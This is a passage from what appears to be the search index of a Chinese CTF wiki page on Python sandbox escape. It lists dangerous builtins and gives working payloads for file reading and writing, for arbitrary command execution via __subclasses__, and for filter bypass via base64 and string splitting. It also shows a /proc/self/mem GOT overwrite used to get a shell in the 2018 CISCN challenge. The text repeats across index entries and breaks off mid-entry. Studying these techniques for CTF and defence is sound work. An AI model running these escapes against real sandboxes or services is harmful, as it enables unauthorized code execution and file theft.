\nReferenceError\n,\n \nRuntimeError\n,\n \nRuntimeWarning\n,\n \nStandardError\n,\n \nStopIteration\n,\n \nSyntaxError\n,\n \nSyntaxWarning\n,\n \nSystemError\n,\n \nSystemExit\n,\n \nTabError\n,\n \nTrue\n,\n \nTypeError\n,\n \nUnboundLocalError\n,\n \nUnicodeDecodeError\n,\n \nUnicodeEncodeError\n,\n \nUnicodeError\n,\n \nUnicodeTranslateError\n,\n \nUnicodeWarning\n,\n \nUserWarning\n,\n \nValueError\n,\n \nWarning\n,\n \nZeroDivisionError\n,\n \n_\n,\n \n__debug__\n,\n \n__doc__\n,\n \n__import__\n,\n \n__name__\n,\n \n__package__\n,\n \nabs\n,\n \nall\n,\n \nany\n,\n \napply\n,\n \nbasestring\n,\n \nbin\n,\n \nbool\n,\n \nbuffer\n,\n \nbytearray\n,\n \nbytes\n,\n \ncallable\n,\n \nchr\n,\n \nclassmethod\n,\n \ncmp\n,\n \ncoerce\n,\n \ncompile\n,\n \ncomplex\n,\n \ncopyright\n,\n \ncredits\n,\n \ndelattr\n,\n \ndict\n,\n \ndir\n,\n \ndivmod\n,\n \nenumerate\n,\n \neval\n,\n \nexecfile\n,\n \nexit\n,\n \nfile\n,\n \nfilter\n,\n \nfloat\n,\n \nformat\n,\n \nfrozenset\n,\n \ngetattr\n,\n \nglobals\n,\n \nhasattr\n,\n \nhash\n,\n \nhelp\n,\n \nhex\n,\n \nid\n,\n \ninput\n,\n \nint\n,\n \nintern\n,\n \nisinstance\n,\n \nissubclass\n,\n \niter\n,\n \nlen\n,\n \nlicense\n,\n \nlist\n,\n \nlocals\n,\n \nlong\n,\n \nmap\n,\n \nmax\n,\n \nmemoryview\n,\n \nmin\n,\n \nnext\n,\n \nobject\n,\n \noct\n,\n \nopen\n,\n \nord\n,\n \npow\n,\n \nprint\n,\n \nproperty\n,\n \nquit\n,\n \nrange\n,\n \nraw_input\n,\n \nreduce\n,\n \nreload\n,\n \nrepr\n,\n \nreversed\n,\n \nround\n,\n \nset\n,\n \nsetattr\n,\n \nslice\n,\n \nsorted\n,\n \nstaticmethod\n,\n \nstr\n,\n \nsum\n,\n \nsuper\n,\n \ntuple\n,\n \ntype\n,\n \nunichr\n,\n \nunicode\n,\n \nvars\n,\n \nxrange\n,\n \nzip\n]\n\n\n\n\u5728Python\u4e2d\uff0c\u4e0d\u5f15\u5165\u76f4\u63a5\u4f7f\u7528\u7684\u5185\u7f6e\u51fd\u6570\u88ab\u6210\u4e3a \nbuiltin\n \u51fd\u6570\uff0c\u968f\u7740 \n__builtin__\n \u8fd9\u4e2a\u6a21\u5757\u81ea\u52a8\u5f15\u5165\u5230\u73af\u5883\u4e2d\u3002\u90a3\u4e48\u6211\u4eec\u5982\u4f55\u5f15\u5165\u7684\u6a21\u5757\u5462\uff1f\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 \n__dict__\n \u5f15\u5165\u6211\u4eec\u60f3\u8981\u5f15\u5165\u7684\u6a21\u5757\u3002\n__dict__\n \u7684\u4f5c\u7528\u662f\u5217\u51fa\u4e00\u4e2a\u6a21\u7ec4/\u7c7b/\u5bf9\u8c61 \u4e0b\u9762 \u6240\u6709\u7684\u5c5e\u6027\u548c\u51fd\u6570\u3002\u8fd9\u5728\u6c99\u76d2\u9003\u9038\u4e2d\u662f\u5f88\u6709\u7528\u7684,\u53ef\u4ee5\u627e\u5230\u9690\u85cf\u5728\u5176\u4e2d\u7684\u4e00\u4e9b\u4e1c\u897f\n\n__dict__\n\u80fd\u505a\u4ec0\u4e48\u5462\uff1f\n\u6211\u4eec\u77e5\u9053\uff0c\u4e00\u4e2a\u6a21\u5757\u5bf9\u8c61\u6709\u4e00\u4e2a\u7531\u5b57\u5178\u5bf9\u8c61\u5b9e\u73b0\u7684\u547d\u540d\u7a7a\u95f4\uff0c\u5c5e\u6027\u7684\u5f15\u7528\u4f1a\u88ab\u8f6c\u6362\u4e3a\u8fd9\u4e2a\u5b57\u5178\u4e2d\u7684\u67e5\u627e\uff0c\u4f8b\u5982\uff0cm.x \u7b49\u540c\u4e8e m.dict[\"x\"]\u3002\n\n\n\u7ed5\u8fc7\u5b9e\u4f8b\uff1a\n\u9996\u5148\u901a\u8fc7 base64 \u7ed5\u8fc7\u5b57\u7b26\u660e\u6587\u68c0\u6d4b\n\n \nimport\n \nbase64\n\n\n \nbase64\n.\nb64encode\n(\n__import__\n)\n\n\nX19pbXBvcnRfXw==\n\n\n \nbase64\n.\nb64encode\n(\nos\n)\n\n\nb3M=\n\n\n\n\u7136\u540e\u901a\u8fc7 \n__dict__\n \u5f15\u7528\n\n \n__builtins__\n.\n__dict__\n[\nX19pbXBvcnRfXw==\n.\ndecode\n(\nbase64\n)](\nb3M=\n.\ndecode\n(\nbase64\n))\n\n\n\n\n\u5982\u679c\u4e00\u4e9b \u5185\u655b\u51fd\u6570\u5728 \nbuiltins\n \u5220\u9664 \uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 reload(\nbuiltins\n) \u91cd\u65b0\u8f7d\u5165\u83b7\u53d6\u4e00\u4e2a\u5b8c\u6574\u7684 \nbuiltins\n\n\n\u521b\u5efa\u5bf9\u8c61\u4ee5\u53ca\u5f15\u7528\n\n\nPython \u7684 object \u7c7b\u4e2d\u96c6\u6210\u4e86\u5f88\u591a\u7684\u57fa\u7840\u51fd\u6570\uff0c\u6211\u4eec\u60f3\u8981\u8c03\u7528\u7684\u65f6\u5019\u4e5f\u662f\u53ef\u4ee5\u901a\u8fc7\u521b\u5efa\u5bf9\u8c61\u8fdb\u800c\u5f15\u7528\u3002\n\n\n\u6211\u4eec\u6709\u5e38\u89c1\u7684\u4e24\u4e2a\u65b9\u6cd5\uff1a\n\n()\n.__class__.__bases__\n[\n0\n]\n\n\n.__class__.__mro__\n[\n2\n]\n\n\n\n\n\n\u5982\uff0c\u6211\u4eec\u53ef\u901a\u8fc7\n\nprint ().__class__.__bases__[0].__subclasses__()[40](\n/etc/services\n).read()\n\u8fbe\u5230\u6587\u4ef6\u8bfb\u53d6\u7684\u6548\u679c\uff0c\n\n\n\u5e38\u89c1payload\n\n\n#\u8bfb\u6587\u4ef6\n\n\n()\n.\n__class__\n.\n__bases__\n[\n0\n]\n.\n__subclasses__\n()[\n40\n](\nr\nC:\\1.php\n)\n.\nread\n()\n\n\n\n#\u5199\u6587\u4ef6\n\n\n()\n.\n__class__\n.\n__bases__\n[\n0\n]\n.\n__subclasses__\n()[\n40\n](\n/var/www/html/input\n,\n \nw\n)\n.\nwrite\n(\n123\n)\n\n\n\n#\u6267\u884c\u4efb\u610f\u547d\u4ee4\n\n\n()\n.\n__class__\n.\n__bases__\n[\n0\n]\n.\n__subclasses__\n()[\n59\n]\n.\n__init__\n.\nfunc_globals\n.\nvalues\n()[\n13\n][\neval\n](\n__import__(\nos\n).popen(\nls  /var/www/html\n).read()\n \n)\n\n\n\n\n\u95f4\u63a5\u5f15\u7528\n\n\n\u5728\u6709\u4e9b\u9898\u76ee\u4e2d\uff0c\u5982\u8fd9\u6b21\u76842018\u5e74\u56fd\u8d5b\u7684 Python \u6c99\u76d2\u9898\u76ee\u4e0a\uff0cimport \u5176\u5b9e\u6574\u4e2a\u662f\u88ab\u9609\u5272\u4e86\u3002\u4f46\u662f\u5728 Python \u4e2d\uff0c\u539f\u751f\u7684 \n__import__\n \u662f\u5b58\u5728\u88ab\u5f15\u7528\u7684\uff0c\u53ea\u8981\u6211\u4eec\u627e\u5230\u76f8\u5173\u5bf9\u8c61\u5f15\u7528\u5c31\u53ef\u4ee5\u8fdb\u4e00\u6b65\u83b7\u53d6\u6211\u4eec\u60f3\u8981\u7684\u5185\u5bb9\uff0c\u5177\u4f53\u4e0b\u9762\u7684demo\u4f1a\u8bb2\u8ff0\u5230\n\n\nwrite\u4fee\u6539got\u8868\n\n\n\u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a \n/proc/self/mem\n \u7684\u5185\u5b58\u64cd\u4f5c\u65b9\u6cd5\n\n/proc/self/mem\n \u662f\u5185\u5b58\u955c\u50cf\uff0c\u80fd\u591f\u901a\u8fc7\u5b83\u6765\u8bfb\u5199\u5230\u8fdb\u7a0b\u7684\u6240\u6709\u5185\u5b58\uff0c\u5305\u62ec\u53ef\u6267\u884c\u4ee3\u7801\uff0c\u5982\u679c\u6211\u4eec\u80fd\u83b7\u53d6\u5230Python\u4e00\u4e9b\u51fd\u6570\u7684\u504f\u79fb\uff0c\u5982 \nsystem\n \uff0c\u6211\u4eec\u4fbf\u53ef\u4ee5\u901a\u8fc7\u8986\u5199 got \u8868\u8fbe\u5230 getshell\u7684\u76ee\u7684\u3002\n\n(\nlambda\n \nr\n,\nw\n:\nr\n.\nseek\n(\n0x08de2b8\n)\n \nor\n \nw\n.\nseek\n(\n0x08de8c8\n)\n \nor\n \nw\n.\nwrite\n(\nr\n.\nread\n(\n8\n))\n \nor\n \n()\n.\n__class__\n.\n__bases__\n[\n0\n]\n.\n__subclasses__\n()[\n40\n](\nc\n+\nat /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb\n))(()\n.\n__class__\n.\n__bases__\n[\n0\n]\n.\n__subclasses__\n()[\n40\n](\n/proc/self/mem\n,\nr\n),()\n.\n__class__\n.\n__bases__\n[\n0\n]\n.\n__subclasses__\n()[\n40\n](\n/proc/self/mem\n,\n \nw\n,\n \n0\n))\n\n\n\n\u7b2c\u4e00\u4e2a\u5730\u5740\u662f system \u7684\u504f\u79fb\uff0c\u7b2c\u4e8c\u4e2a\u662ffopen\u7684\u504f\u79fb\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 \nobjdump\n \u83b7\u53d6\u76f8\u5173\u4fe1\u606f\n\n\n\n\u4f8b\u5b50\n\n\n2018 ciscn \u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b\u4e2d\u7684 Python \u6c99\u7bb1\u9003\u9038\u3002\n\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\nprint ().__class__.__bases__[0].__subclasses__()[40](\n/home/ctf/sandbox.py\n).read()\n \u83b7\u53d6\u9898\u76ee\u6e90\u7801\uff0c\u7136\u540e\u53ef\u4ee5\u8fdb\u4e00\u6b65\u5206\u6790\uff0c\u4ee5\u4e0b\u63d0\u4f9b\u4e09\u79cd\u9003\u9038\u65b9\u6cd5\u3002\n\n\n\u521b\u5efa\u5bf9\u8c61\u5e76\u5229\u7528 Python \u64cd\u4f5c\u5b57\u7b26\u4e32\u7684\u7279\u6027\n\n\nx\n \n=\n \n[\nx\n \nfor\n \nx\n \nin\n \n[]\n.\n__class__\n.\n__base__\n.\n__subclasses__\n()\n \nif\n \nx\n.\n__name__\n \n==\n \nca\n+\ntch_warnings\n][\n0\n]\n.\n__init__\n\n\nx\n.\n__getattribute__\n(\nfunc_global\n+\ns\n)[\nlinecache\n]\n.\n__dict__\n[\no\n+\ns\n]\n.\n__dict__\n[\nsy\n+\nstem\n](\nl\n+\ns\n)\n\n\nx\n.\n__getattribute__\n(\nfunc_global\n+\ns\n)[\nlinecache\n]\n.\n__dict__\n[\no\n+\ns\n]\n.\n__dict__\n[\nsy\n+\nstem\n](\nl\n+\ns /home/ctf\n)\n\n\nx\n.\n__getattribute__\n(\nfunc_global\n+\ns\n)[\nlinecache\n]\n.\n__dict__\n[\no\n+\ns\n]\n.\n__dict__\n[\nsy\n+\nstem\n](\nca\n+\nt /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb\n)\n\n\n\n\n\n\u52ab\u6301 got \u8868 getshell\n\n\n(\nlambda\n \nr\n,\nw\n:\nr\n.\nseek\n(\n0x08de2b8\n)\n \nor\n \nw\n.\nseek\n(\n0x08de8c8\n)\n \nor\n \nw\n.\nwrite\n(\nr\n.\nread\n(\n8\n))\n \nor\n \n()\n.\n__class__\n.\n__bases__\n[\n0\n]\n.\n__subclasses__\n()[\n40\n](\nl\n+\ns /home/ctf/\n))(()\n.\n__class__\n.\n__bases__\n[\n0\n]\n.\n__subclasses__\n()[\n40\n](\n/proc/self/mem\n,\nr\n),()\n.\n__class__\n.\n__bases__\n[\n0\n]\n.\n__subclasses__\n()[\n40\n](\n/proc/self/mem\n,\n \nw\n,\n \n0\n))\n\n\n\n\n(\nlambda\n \nr\n,\nw\n:\nr\n.\nseek\n(\n0x08de2b8\n)\n \nor\n \nw\n.\nseek\n(\n0x08de8c8\n)\n \nor\n \nw\n.\nwrite\n(\nr\n.\nread\n(\n8\n))\n \nor\n \n()\n.\n__class__\n.\n__bases__\n[\n0\n]\n.\n__subclasses__\n()[\n40\n](\nc\n+\nat /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb\n))(()\n.\n__class__\n.\n__bases__\n[\n0\n]\n.\n__subclasses__\n()[\n40\n](\n/proc/self/mem\n,\nr\n),()\n.\n__class__\n.\n__bases__\n[\n0\n]\n.\n__subclasses__\n()[\n40\n](\n/proc/self/mem\n,\n \nw\n,\n \n0\n))\n\n\n\n\n\n\u5bfb\u627e \nimport\n \u7684\u95f4\u63a5\u5f15\u7528\n\n\n\u5728\u4e0d\u65ad\u7684 dir \u8fc7\u7a0b\u4e2d\uff0c\u53d1\u73b0 \nclosure\n  \u8fd9\u4e2a object \u4fdd\u5b58\u4e86\u53c2\u6570\uff0c\u53ef\u4ee5\u5f15\u7528\u539f\u751f\u7684 \nimport\n\n\nprint\n \n__import__\n.\n__getattribute__\n(\n__clo\n+\nsure__\n)[\n0\n]\n.\ncell_contents\n(\no\n+\ns\n)\n.\n__getattribute__\n(\nsy\n+\nstem\n)(\nl\n+\ns home\n)\n \n\n\n\n\u53c2\u8003\n\n\nhttps://xz.aliyun.com/t/52#toc-10\n \n\nhttps://blog.csdn.net/qq_35078631/article/details/78504415\n \n\nhttps://www.anquanke.com/post/id/85571\n \n\nhttp://bestwing.me/2018/05/03/awesome-python-sandbox-in-ciscn/#0x01", 
            "title": "Python\u6c99\u7bb1\u9003\u9038"
        }, 
        {
            "location": "/pwn/sandbox/python-sandbox-escape/#python", 
            "text": "\u6240\u8c13\u7684 Python \u6c99\u76d2\uff0c\u5373\u4ee5\u4e00\u5b9a\u7684\u65b9\u6cd5\u6a21\u62df Python \u7ec8\u7aef\uff0c\u5b9e\u73b0\u7528\u6237\u5bf9 Python \u7684\u4f7f\u7528\u3002", 
            "title": "Python\u6c99\u76d2"
        }, 
        {
            "location": "/pwn/sandbox/python-sandbox-escape/#python_1", 
            "text": "\u6211\u4eec\u901a\u5e38\u6240\u8bf4\u7684 Python \u6c99\u7bb1\u9003\u9038\u5c31\u662f\u7ed5\u8fc7\u6a21\u62df\u7684 Python \u7ec8\u7aef\uff0c\u6700\u7ec8\u5b9e\u73b0\u547d\u4ee4\u6267\u884c\u3002", 
            "title": "Python\u6c99\u7bb1\u9003\u9038\u7684\u4e00\u4e9b\u65b9\u6cd5"
        }, 
        {
            "location": "/pwn/sandbox/python-sandbox-escape/#_1", 
            "text": "\u5728 Python \u7684\u5185\u5efa\u51fd\u6570\u4e2d\uff0c\u6709\u4e00\u4e9b\u51fd\u6570\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u5b9e\u73b0\u4efb\u610f\u547d\u4ee4\u6267\u884c\uff1a os.system() os.popen()\ncommands.getstatusoutput() commands.getoutput()\ncommands.getstatus()\nsubprocess.call(command, shell=True) subprocess.Popen(command, shell=True)\npty.spawn() \n\u5728 Python \u4e2d\u5bfc\u5165\u6a21\u5757\u7684\u65b9\u6cd5\u901a\u5e38\u6709\u4e09\u79cd(xxx\u4e3a\u6a21\u5757\u540d\u79f0\uff09)\uff1a\n1. import xxx\n2. from xxx import *\n3.  import ('xxx')    \n\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4e0a\u8ff0\u7684\u5bfc\u5165\u65b9\u6cd5\uff0c\u5bfc\u5165\u76f8\u5173\u6a21\u5757\u5e76\u4f7f\u7528\u4e0a\u8ff0\u7684\u51fd\u6570\u5b9e\u73b0\u547d\u4ee4\u6267\u884c\u3002\n\u9664\u6b64\u4e4b\u5916\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5 \u901a\u8fc7\u8def\u5f84\u5f15\u5165\u6a21\u5757 \uff1a\n\u5982\u5728 linux \u7cfb\u7edf\u4e2d Python \u7684 os \u6a21\u5757\u7684\u8def\u5f84\u4e00\u822c\u90fd\u662f\u5728 /usr/lib/python2.7/os.py \uff0c\u5f53\u77e5\u9053\u8def\u5f84\u7684\u65f6\u5019\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0b\u7684\u64cd\u4f5c\u5bfc\u5165\u6a21\u5757\uff0c\u7136\u540e\u8fdb\u4e00\u6b65\u4f7f\u7528\u76f8\u5173\u51fd\u6570\u3002   import   sys    sys . modules [ os ] = /usr/lib/python2.7/os.py    import   os    \u5176\u4ed6\u7684\u5371\u9669\u51fd\u6570\u4e3e\u4f8b \n\u5982  execfile  \u6587\u4ef6\u6267\u884c   execfile ( /usr/lib/python2.7/os.py )    system ( cat /etc/passwd )  root : x : 0 : 0 : root : / root : / bin / bash  daemon : x : 1 : 1 : daemon : / usr / sbin : / usr / sbin / nologin  bin : x : 2 : 2 : bin : / bin : / usr / sbin / nologin  sys : x : 3 : 3 : sys : / dev : / usr / sbin / nologin  ...    getcwd ()  /usr/lib/python2.7   timeit  import   timeit  timeit . timeit ( __import__( os ).system( dir ) , number = 1 )    exec \u548c eval \u6bd4\u8f83\u7ecf\u5178\u4e86  eval ( __import__( os ).system( dir ) )   platform  import   platform  print   platform . popen ( dir ) . read ()   \u4f46\u662f\uff0c\u6b63\u5e38\u7684 Python \u6c99\u7bb1\u4f1a\u4ee5\u9ed1\u540d\u5355\u7684\u5f62\u5f0f\u7981\u6b62\u4f7f\u7528\u4e00\u4e9b\u6a21\u5757\u5982 os \u6216\u4ee5\u767d\u540d\u5355\u7684\u5f62\u5f0f\u53ea\u5141\u8bb8\u7528\u6237\u4f7f\u7528\u6c99\u7bb1\u63d0\u4f9b\u7684\u6a21\u5757\uff0c\u7528\u4ee5\u963b\u6b62\u7528\u6237\u7684\u5371\u9669\u64cd\u4f5c\u3002\u800c\u5982\u4f55\u8fdb\u4e00\u6b65\u9003\u9038\u6c99\u7bb1\u5c31\u662f\u6211\u4eec\u7684\u91cd\u70b9\u7814\u7a76\u5185\u5bb9\u3002", 
            "title": "\u5bfc\u5165\u6a21\u5757"
        }, 
        {
            "location": "/pwn/sandbox/python-sandbox-escape/#python_2", 
            "text": "\u5f53\u6211\u4eec\u4e0d\u80fd\u5bfc\u5165\u6a21\u5757\uff0c\u6216\u8005\u60f3\u8981\u5bfc\u5165\u7684\u6a21\u5757\u88ab\u7981\uff0c\u90a3\u4e48\u6211\u4eec\u53ea\u80fd\u5bfb\u6c42 Python \u672c\u8eab\u5185\u7f6e\u51fd\u6570\uff08\u5373\u901a\u5e38\u4e0d\u7528\u4eba\u4e3a\u5bfc\u5165\uff0cPython\u672c\u8eab\u9ed8\u8ba4\u5df2\u7ecf\u5bfc\u5165\u7684\u51fd\u6570\uff09\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u53ef\u4ee5\u901a\u8fc7  dir __builtin__  \u6765\u83b7\u53d6\u5185\u7f6e\u51fd\u6570\u5217\u8868   dir ( __builtins__ )  [ ArithmeticError ,   AssertionError ,   AttributeError ,   BaseException ,   BufferError ,   BytesWarning ,   DeprecationWarning ,   EOFError ,   Ellipsis ,   EnvironmentError ,   Exception ,   False ,   FloatingPointError ,   FutureWarning ,   GeneratorExit ,   IOError ,   ImportError ,   ImportWarning ,   IndentationError ,   IndexError ,   KeyError ,   KeyboardInterrupt ,   LookupError ,   MemoryError ,   NameError ,   None ,   NotImplemented ,   NotImplementedError ,   OSError ,   OverflowError ,   PendingDeprecationWarning ,   ReferenceError ,   RuntimeError ,   RuntimeWarning ,   StandardError ,   StopIteration ,   SyntaxError ,   SyntaxWarning ,   SystemError ,   SystemExit ,   TabError ,   True ,   TypeError ,   UnboundLocalError ,   UnicodeDecodeError ,   UnicodeEncodeError ,   UnicodeError ,   UnicodeTranslateError ,   UnicodeWarning ,   UserWarning ,   ValueError ,   Warning ,   ZeroDivisionError ,   _ ,   __debug__ ,   __doc__ ,   __import__ ,   __name__ ,   __package__ ,   abs ,   all ,   any ,   apply ,   basestring ,   bin ,   bool ,   buffer ,   bytearray ,   bytes ,   callable ,   chr ,   classmethod ,   cmp ,   coerce ,   compile ,   complex ,   copyright ,   credits ,   delattr ,   dict ,   dir ,   divmod ,   enumerate ,   eval ,   execfile ,   exit ,   file ,   filter ,   float ,   format ,   frozenset ,   getattr ,   globals ,   hasattr ,   hash ,   help ,   hex ,   id ,   input ,   int ,   intern ,   isinstance ,   issubclass ,   iter ,   len ,   license ,   list ,   locals ,   long ,   map ,   max ,   memoryview ,   min ,   next ,   object ,   oct ,   open ,   ord ,   pow ,   print ,   property ,   quit ,   range ,   raw_input ,   reduce ,   reload ,   repr ,   reversed ,   round ,   set ,   setattr ,   slice ,   sorted ,   staticmethod ,   str ,   sum ,   super ,   tuple ,   type ,   unichr ,   unicode ,   vars ,   xrange ,   zip ]  \n\u5728Python\u4e2d\uff0c\u4e0d\u5f15\u5165\u76f4\u63a5\u4f7f\u7528\u7684\u5185\u7f6e\u51fd\u6570\u88ab\u6210\u4e3a  builtin  \u51fd\u6570\uff0c\u968f\u7740  __builtin__  \u8fd9\u4e2a\u6a21\u5757\u81ea\u52a8\u5f15\u5165\u5230\u73af\u5883\u4e2d\u3002\u90a3\u4e48\u6211\u4eec\u5982\u4f55\u5f15\u5165\u7684\u6a21\u5757\u5462\uff1f\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7  __dict__  \u5f15\u5165\u6211\u4eec\u60f3\u8981\u5f15\u5165\u7684\u6a21\u5757\u3002 __dict__  \u7684\u4f5c\u7528\u662f\u5217\u51fa\u4e00\u4e2a\u6a21\u7ec4/\u7c7b/\u5bf9\u8c61 \u4e0b\u9762 \u6240\u6709\u7684\u5c5e\u6027\u548c\u51fd\u6570\u3002\u8fd9\u5728\u6c99\u76d2\u9003\u9038\u4e2d\u662f\u5f88\u6709\u7528\u7684,\u53ef\u4ee5\u627e\u5230\u9690\u85cf\u5728\u5176\u4e2d\u7684\u4e00\u4e9b\u4e1c\u897f __dict__ \u80fd\u505a\u4ec0\u4e48\u5462\uff1f\n\u6211\u4eec\u77e5\u9053\uff0c\u4e00\u4e2a\u6a21\u5757\u5bf9\u8c61\u6709\u4e00\u4e2a\u7531\u5b57\u5178\u5bf9\u8c61\u5b9e\u73b0\u7684\u547d\u540d\u7a7a\u95f4\uff0c\u5c5e\u6027\u7684\u5f15\u7528\u4f1a\u88ab\u8f6c\u6362\u4e3a\u8fd9\u4e2a\u5b57\u5178\u4e2d\u7684\u67e5\u627e\uff0c\u4f8b\u5982\uff0cm.x \u7b49\u540c\u4e8e m.dict[\"x\"]\u3002  \u7ed5\u8fc7\u5b9e\u4f8b\uff1a\n\u9996\u5148\u901a\u8fc7 base64 \u7ed5\u8fc7\u5b57\u7b26\u660e\u6587\u68c0\u6d4b   import   base64    base64 . b64encode ( __import__ )  X19pbXBvcnRfXw==    base64 . b64encode ( os )  b3M=  \n\u7136\u540e\u901a\u8fc7  __dict__  \u5f15\u7528   __builtins__ . __dict__ [ X19pbXBvcnRfXw== . decode ( base64 )]( b3M= . decode ( base64 ))   \u5982\u679c\u4e00\u4e9b \u5185\u655b\u51fd\u6570\u5728  builtins  \u5220\u9664 \uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 reload( builtins ) \u91cd\u65b0\u8f7d\u5165\u83b7\u53d6\u4e00\u4e2a\u5b8c\u6574\u7684  builtins", 
            "title": "Python \u7684\u5185\u5efa\u51fd\u6570"
        }, 
        {
            "location": "/pwn/sandbox/python-sandbox-escape/#_2", 
            "text": "Python \u7684 object \u7c7b\u4e2d\u96c6\u6210\u4e86\u5f88\u591a\u7684\u57fa\u7840\u51fd\u6570\uff0c\u6211\u4eec\u60f3\u8981\u8c03\u7528\u7684\u65f6\u5019\u4e5f\u662f\u53ef\u4ee5\u901a\u8fc7\u521b\u5efa\u5bf9\u8c61\u8fdb\u800c\u5f15\u7528\u3002  \u6211\u4eec\u6709\u5e38\u89c1\u7684\u4e24\u4e2a\u65b9\u6cd5\uff1a () .__class__.__bases__ [ 0 ]  .__class__.__mro__ [ 2 ]   \n\u5982\uff0c\u6211\u4eec\u53ef\u901a\u8fc7 print ().__class__.__bases__[0].__subclasses__()[40]( /etc/services ).read() \u8fbe\u5230\u6587\u4ef6\u8bfb\u53d6\u7684\u6548\u679c\uff0c  \u5e38\u89c1payload  #\u8bfb\u6587\u4ef6  () . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 40 ]( r C:\\1.php ) . read ()  #\u5199\u6587\u4ef6  () . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 40 ]( /var/www/html/input ,   w ) . write ( 123 )  #\u6267\u884c\u4efb\u610f\u547d\u4ee4  () . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 59 ] . __init__ . func_globals . values ()[ 13 ][ eval ]( __import__( os ).popen( ls  /var/www/html ).read()   )", 
            "title": "\u521b\u5efa\u5bf9\u8c61\u4ee5\u53ca\u5f15\u7528"
        }, 
        {
            "location": "/pwn/sandbox/python-sandbox-escape/#_3", 
            "text": "\u5728\u6709\u4e9b\u9898\u76ee\u4e2d\uff0c\u5982\u8fd9\u6b21\u76842018\u5e74\u56fd\u8d5b\u7684 Python \u6c99\u76d2\u9898\u76ee\u4e0a\uff0cimport \u5176\u5b9e\u6574\u4e2a\u662f\u88ab\u9609\u5272\u4e86\u3002\u4f46\u662f\u5728 Python \u4e2d\uff0c\u539f\u751f\u7684  __import__  \u662f\u5b58\u5728\u88ab\u5f15\u7528\u7684\uff0c\u53ea\u8981\u6211\u4eec\u627e\u5230\u76f8\u5173\u5bf9\u8c61\u5f15\u7528\u5c31\u53ef\u4ee5\u8fdb\u4e00\u6b65\u83b7\u53d6\u6211\u4eec\u60f3\u8981\u7684\u5185\u5bb9\uff0c\u5177\u4f53\u4e0b\u9762\u7684demo\u4f1a\u8bb2\u8ff0\u5230", 
            "title": "\u95f4\u63a5\u5f15\u7528"
        }, 
        {
            "location": "/pwn/sandbox/python-sandbox-escape/#writegot", 
            "text": "\u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a  /proc/self/mem  \u7684\u5185\u5b58\u64cd\u4f5c\u65b9\u6cd5 /proc/self/mem  \u662f\u5185\u5b58\u955c\u50cf\uff0c\u80fd\u591f\u901a\u8fc7\u5b83\u6765\u8bfb\u5199\u5230\u8fdb\u7a0b\u7684\u6240\u6709\u5185\u5b58\uff0c\u5305\u62ec\u53ef\u6267\u884c\u4ee3\u7801\uff0c\u5982\u679c\u6211\u4eec\u80fd\u83b7\u53d6\u5230Python\u4e00\u4e9b\u51fd\u6570\u7684\u504f\u79fb\uff0c\u5982  system  \uff0c\u6211\u4eec\u4fbf\u53ef\u4ee5\u901a\u8fc7\u8986\u5199 got \u8868\u8fbe\u5230 getshell\u7684\u76ee\u7684\u3002 ( lambda   r , w : r . seek ( 0x08de2b8 )   or   w . seek ( 0x08de8c8 )   or   w . write ( r . read ( 8 ))   or   () . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 40 ]( c + at /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb ))(() . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 40 ]( /proc/self/mem , r ),() . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 40 ]( /proc/self/mem ,   w ,   0 ))  \n\u7b2c\u4e00\u4e2a\u5730\u5740\u662f system \u7684\u504f\u79fb\uff0c\u7b2c\u4e8c\u4e2a\u662ffopen\u7684\u504f\u79fb\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7  objdump  \u83b7\u53d6\u76f8\u5173\u4fe1\u606f", 
            "title": "write\u4fee\u6539got\u8868"
        }, 
        {
            "location": "/pwn/sandbox/python-sandbox-escape/#_4", 
            "text": "2018 ciscn \u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b\u4e2d\u7684 Python \u6c99\u7bb1\u9003\u9038\u3002\n\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 print ().__class__.__bases__[0].__subclasses__()[40]( /home/ctf/sandbox.py ).read()  \u83b7\u53d6\u9898\u76ee\u6e90\u7801\uff0c\u7136\u540e\u53ef\u4ee5\u8fdb\u4e00\u6b65\u5206\u6790\uff0c\u4ee5\u4e0b\u63d0\u4f9b\u4e09\u79cd\u9003\u9038\u65b9\u6cd5\u3002", 
            "title": "\u4f8b\u5b50"
        }, 
        {
            "location": "/pwn/sandbox/python-sandbox-escape/#python_3", 
            "text": "x   =   [ x   for   x   in   [] . __class__ . __base__ . __subclasses__ ()   if   x . __name__   ==   ca + tch_warnings ][ 0 ] . __init__  x . __getattribute__ ( func_global + s )[ linecache ] . __dict__ [ o + s ] . __dict__ [ sy + stem ]( l + s )  x . __getattribute__ ( func_global + s )[ linecache ] . __dict__ [ o + s ] . __dict__ [ sy + stem ]( l + s /home/ctf )  x . __getattribute__ ( func_global + s )[ linecache ] . __dict__ [ o + s ] . __dict__ [ sy + stem ]( ca + t /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb )", 
            "title": "\u521b\u5efa\u5bf9\u8c61\u5e76\u5229\u7528 Python \u64cd\u4f5c\u5b57\u7b26\u4e32\u7684\u7279\u6027"
        }, 
        {
            "location": "/pwn/sandbox/python-sandbox-escape/#got-getshell", 
